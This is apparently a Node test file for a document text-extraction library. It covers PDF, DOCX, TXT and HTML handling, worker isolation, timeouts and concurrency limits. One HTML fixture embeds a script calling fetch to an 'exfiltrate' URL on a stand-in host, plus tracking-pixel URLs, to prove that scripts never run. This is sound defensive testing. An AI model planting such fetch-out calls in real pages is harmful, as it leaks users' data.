import assert from "node:assert/strict";
import test from "node:test";
import fs from "node:fs";
import path from "node:path";
import JSZip from "jszip";
import { extractCorpusCandidateText, _getActiveExtractionWorkerCountForTesting } from "../lib/corpus-text-extraction.ts";
import { extractTextFromHtml } from "../lib/html-text-extraction.ts";
import { DEFAULT_CORPUS_ADMISSION_LIMITS } from "../lib/corpus-admission-types.ts";
import { buildMinimalEncryptedPdf } from "./helpers/pdf-fixtures.mjs";

const repoRoot = path.resolve(".");

// --- Real PDF fixture ------------------------------------------------------

test("a real PDF extracts real text through the isolated worker boundary", async () => {
  const bytes = fs.readFileSync(path.join(repoRoot, "tests/fixtures/attention-is-all-you-need.pdf"));
  const result = await extractCorpusCandidateText("pdf", bytes);
  assert.equal(result.ok, true);
  assert.match(result.rawText, /attention/i);
  assert.ok(result.rawText.length > 3000);
});

// --- Real minimal DOCX fixture ----------------------------------------------

async function buildMinimalDocx(bodyText) {
  const zip = new JSZip();
  zip.file("[Content_Types].xml", `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`);
  zip.file("_rels/.rels", `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`);
  zip.file("word/document.xml", `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>${bodyText}</w:t></w:r></w:p></w:body></w:document>`);
  return zip.generateAsync({ type: "nodebuffer" });
}

test("a real minimal DOCX extracts real text through the isolated worker boundary", async () => {
  const bytes = await buildMinimalDocx("Hello from a real docx fixture used by the corpus admission gate tests.");
  const result = await extractCorpusCandidateText("docx", bytes);
  assert.equal(result.ok, true);
  assert.match(result.rawText, /Hello from a real docx fixture/);
});

// --- txt / html --------------------------------------------------------------

test("txt is decoded as plain UTF-8", async () => {
  const result = await extractCorpusCandidateText("txt", Buffer.from("plain text content", "utf8"));
  assert.equal(result.ok, true);
  assert.equal(result.rawText, "plain text content");
});

// --- WORKER-01: validated txt bypasses the isolated worker entirely --------
// lib/corpus-extraction-worker.ts cannot load in a deployed Vercel
// serverless function (confirmed live in Preview runtime logs: "Failed to
// load the ES module: .../corpus-extraction-worker.<hash>.ts" — Next.js
// copies the file into the build as a raw, untranspiled asset, which a bare
// Node runtime with no tsx loader cannot parse). Plain-text decoding needs
// no untrusted-parser isolation at all, so lib/corpus-text-extraction.ts's
// extractCorpusCandidateText now decodes txt inline instead of routing it
// through the worker — these tests prove that bypass is real, not just
// that txt still "works" (which it already did before this fix, since
// every test file here runs under `node --import tsx`, which papers over
// the exact defect that broke it in production).

test("validated txt bypasses the worker entirely: never acquires a worker slot, resolves near-instantly", async () => {
  assert.equal(_getActiveExtractionWorkerCountForTesting(), 0, "sanity: no worker active before this test runs");
  const startedAt = Date.now();
  const result = await extractCorpusCandidateText("txt", Buffer.from("a plausible plain-text corpus candidate", "utf8"));
  const elapsedMs = Date.now() - startedAt;
  assert.equal(result.ok, true);
  assert.equal(_getActiveExtractionWorkerCountForTesting(), 0, "a txt extraction must never acquire a worker slot at any point");
  assert.ok(elapsedMs < 50, `txt extraction took ${elapsedMs}ms — a real Worker spawn+postMessage round trip takes far longer than this; this must be a synchronous in-process decode, not a worker hop`);
});

test("the txt bypass's extractorVersion is byte-identical to the worker's own txt branch, so a decision can never distinguish which path produced it", async () => {
  const result = await extractCorpusCandidateText("txt", Buffer.from("consistent extractor version across both code paths", "utf8"));
  assert.equal(result.ok, true);
  assert.equal(result.extractorVersion, "plain-text-decode-v1");
});

test("PDF extraction still spawns a real isolated worker — active worker count is observably non-zero mid-extraction, unaffected by the txt bypass", async () => {
  const pdfBytes = fs.readFileSync(path.join(repoRoot, "tests/fixtures/attention-is-all-you-need.pdf"));
  const extractionPromise = extractCorpusCandidateText("pdf", pdfBytes);
  // Real PDF parsing takes real wall-clock time (unlike the synchronous txt
  // bypass above) — a short poll after kicking it off reliably observes the
  // worker slot having been acquired before extraction completes.
  await new Promise((resolve) => setTimeout(resolve, 10));
  const observedDuringExtraction = _getActiveExtractionWorkerCountForTesting();
  const result = await extractionPromise;
  assert.equal(result.ok, true);
  assert.ok(observedDuringExtraction >= 1, `PDF extraction must still acquire a real worker slot — observed ${observedDuringExtraction} active workers mid-extraction`);
});

test("HTML extraction still spawns a real isolated worker — active worker count is observably non-zero mid-extraction, unaffected by the txt bypass", async () => {
  // A plain, ordinary-sized HTML fixture is enough here: the margin the
  // 10ms poll below relies on comes from real Worker startup (a genuine new
  // OS thread + V8 isolate, reliably tens of milliseconds), not from making
  // the HTML itself slow to strip — extractTextFromHtml's own regex passes
  // are cheap regardless of size, so there is no need to inflate the
  // fixture (a large repeated string here was found to add real memory
  // pressure under concurrent multi-file worker-thread load and is not
  // needed for the assertion to be meaningful).
  const html = "<html><body><p>Real paragraph text used to prove this format still routes through the isolated worker.</p></body></html>";
  const extractionPromise = extractCorpusCandidateText("html", Buffer.from(html, "utf8"));
  await new Promise((resolve) => setTimeout(resolve, 10));
  const observedDuringExtraction = _getActiveExtractionWorkerCountForTesting();
  const result = await extractionPromise;
  assert.equal(result.ok, true);
  assert.ok(observedDuringExtraction >= 1, `HTML extraction must still acquire a real worker slot — observed ${observedDuringExtraction} active workers mid-extraction`);
});

test("html is extracted via lib/html-text-extraction.ts, matching what direct extractTextFromHtml produces", async () => {
  const html = "<html><body><p>Real paragraph text.</p></body></html>";
  const result = await extractCorpusCandidateText("html", Buffer.from(html, "utf8"));
  assert.equal(result.ok, true);
  assert.equal(result.rawText, extractTextFromHtml(html));
});

test("HTML extraction never executes scripts and never fetches remote resources — script/style content never survives, and this module performs no network access", async () => {
  const html = `<html><body>
    <script>globalThis.__shouldNeverRun = true; fetch("http://example.test/exfiltrate");</script>
    <style>.x { background: url(http://example.test/track.png); }</style>
    <img src="http://example.test/pixel.png">
    <p>Real visible paragraph text.</p>
  </body></html>`;
  const result = await extractCorpusCandidateText("html", Buffer.from(html, "utf8"));
  assert.equal(result.ok, true);
  assert.doesNotMatch(result.rawText, /fetch|globalThis|exfiltrate|__shouldNeverRun/);
  assert.match(result.rawText, /Real visible paragraph text/);
  assert.equal(globalThis.__shouldNeverRun, undefined, "the script must never have actually executed");
});

// --- corrupted / malformed input -------------------------------------------

test("corrupted PDF bytes produce a structured failure, never a thrown exception", async () => {
  const result = await extractCorpusCandidateText("pdf", Buffer.from("%PDF-1.4\nthis is not real pdf content", "utf8"));
  assert.equal(result.ok, false);
  assert.equal(result.reasonCode, "EXTRACTION_FAILED");
});

test("corrupted DOCX bytes produce a structured failure, never a thrown exception", async () => {
  const result = await extractCorpusCandidateText("docx", Buffer.from([0x50, 0x4b, 0x03, 0x04, 1, 2, 3, 4, 5]));
  assert.equal(result.ok, false);
});

test("malformed/invalid UTF-8 byte sequences in a txt candidate are handled without crashing", async () => {
  const invalidUtf8 = Buffer.from([0xff, 0xfe, 0x00, 0x80, 0x81, 0x41, 0x42, 0x43]);
  const result = await extractCorpusCandidateText("txt", invalidUtf8);
  // Node's Buffer.toString('utf8') replaces invalid sequences with U+FFFD
  // rather than throwing — the important property is no crash and a
  // well-formed result either way.
  assert.equal(typeof result.ok, "boolean");
});

// WORKER-01: this and the maxExtractedChars test below now exercise the new
// inline txt bypass (format "txt" no longer reaches runExtractionWorker at
// all — see extractCorpusCandidateText) rather than the worker's own txt
// branch, via the exact same shared finalizeExtractedText tail — same
// reason codes, same result shape, on purpose.
test("an empty extraction result is reported as EXTRACTION_EMPTY_RESULT", async () => {
  const result = await extractCorpusCandidateText("txt", Buffer.from("   \n\n  ", "utf8"));
  assert.equal(result.ok, false);
  assert.equal(result.reasonCode, "EXTRACTION_EMPTY_RESULT");
});

// --- limits: page count / extracted-char cap / hard timeout -----------------

test("extracted content exceeding maxExtractedChars is rejected", async () => {
  const tinyLimits = { ...DEFAULT_CORPUS_ADMISSION_LIMITS, maxExtractedChars: { value: 10, status: "ENGINEERING_DEFAULT", rationale: "test" } };
  const result = await extractCorpusCandidateText("txt", Buffer.from("this text is definitely longer than ten characters", "utf8"), tinyLimits);
  assert.equal(result.ok, false);
  assert.equal(result.reasonCode, "EXTRACTED_CONTENT_TOO_LARGE");
});

test("a hard timeout terminates a pathologically slow extraction and returns EXTRACTION_TIMEOUT within a bounded wall-clock window — a real OS-thread-level termination, not a same-thread soft timeout", async () => {
  // Deliberately triggers pdfjs against a byte stream large enough / malformed
  // enough that parsing takes real, non-trivial time, combined with an
  // aggressively short configured timeout — proving the worker is actually
  // killed rather than merely stopped-waiting-on.
  const tinyTimeoutLimits = { ...DEFAULT_CORPUS_ADMISSION_LIMITS, extractionTimeoutMs: { value: 1, status: "ENGINEERING_DEFAULT", rationale: "test" } };
  const bytes = fs.readFileSync(path.join(repoRoot, "tests/fixtures/attention-is-all-you-need.pdf"));
  const startedAt = Date.now();
  const result = await extractCorpusCandidateText("pdf", bytes, tinyTimeoutLimits);
  const elapsedMs = Date.now() - startedAt;
  assert.equal(result.ok, false);
  assert.equal(result.reasonCode, "EXTRACTION_TIMEOUT");
  assert.ok(elapsedMs < 5000, `timeout handling took ${elapsedMs}ms, expected well under 5000ms even for a real multi-page PDF`);
});

// --- encrypted PDF (see tests/helpers/pdf-fixtures.mjs for the real PDF standard security handler implementation) ---

test("a password-protected PDF is caught as PasswordException and reported as EXTRACTION_FAILED, not an uncaught crash", async () => {
  const bytes = buildMinimalEncryptedPdf();
  const result = await extractCorpusCandidateText("pdf", bytes);
  assert.equal(result.ok, false);
  assert.equal(result.reasonCode, "EXTRACTION_FAILED");
  assert.match(result.detail, /password|encrypted/i);
});

// --- library-level worker-concurrency limit ---------------------------------

test("worker concurrency never exceeds the configured limit, even when far more extractions are requested at once", async () => {
  const limitedLimits = { ...DEFAULT_CORPUS_ADMISSION_LIMITS, extractionWorkerConcurrencyLimit: { value: 2, status: "ENGINEERING_DEFAULT", rationale: "test" } };
  const pdfBytes = fs.readFileSync(path.join(repoRoot, "tests/fixtures/attention-is-all-you-need.pdf"));

  let maxObserved = 0;
  let samples = 0;
  const poller = setInterval(() => {
    samples += 1;
    maxObserved = Math.max(maxObserved, _getActiveExtractionWorkerCountForTesting());
  }, 5);

  try {
    // 8 concurrent real-PDF extractions against a configured limit of 2 —
    // if the semaphore in lib/corpus-text-extraction.ts did not actually
    // bound real Worker spawning, this would let all 8 run at once.
    const results = await Promise.all(Array.from({ length: 8 }, () => extractCorpusCandidateText("pdf", pdfBytes, limitedLimits)));
    for (const result of results) {
      assert.equal(result.ok, true, "sanity: every extraction must still succeed under the concurrency limit, just queued");
    }
  } finally {
    clearInterval(poller);
  }

  assert.ok(samples > 0, "sanity: the poller must have actually sampled the counter during the run");
  assert.ok(maxObserved <= 2, `active worker count must never exceed the configured limit of 2, observed a peak of ${maxObserved}`);
  assert.ok(maxObserved >= 1, "sanity: at least one worker must have been observed active at some point");
  assert.equal(_getActiveExtractionWorkerCountForTesting(), 0, "the active count must return to zero once every extraction has settled");
});
